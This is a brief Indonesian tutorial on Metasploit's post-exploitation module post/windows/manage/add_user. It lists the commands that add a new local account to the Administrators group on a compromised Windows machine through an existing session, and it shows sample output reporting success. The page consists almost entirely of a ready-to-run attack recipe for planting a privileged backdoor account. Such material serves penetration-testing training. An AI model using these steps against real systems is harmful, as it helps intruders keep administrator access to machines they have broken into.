# add_user

Modul `add_user` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk menambahkan akun pengguna lokal baru pada komputer target.

## Cara Penggunaan di Metasploit

```
use post/windows/manage/add_user
set ADDTODOMAIN false
set ADDTOGROUP true
set GROUP Administrators
set PASSWORD <PASSWORD>
set SESSION <ID>
set USERNAME <USERNAME>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Running module on 'ADMIN-PC'
[*] Local Mode
[+] User 'fixploit03' was added.
[+] 'fixploit03' is now a member of the 'Administtators' group.
[*] Post module execution completed
```
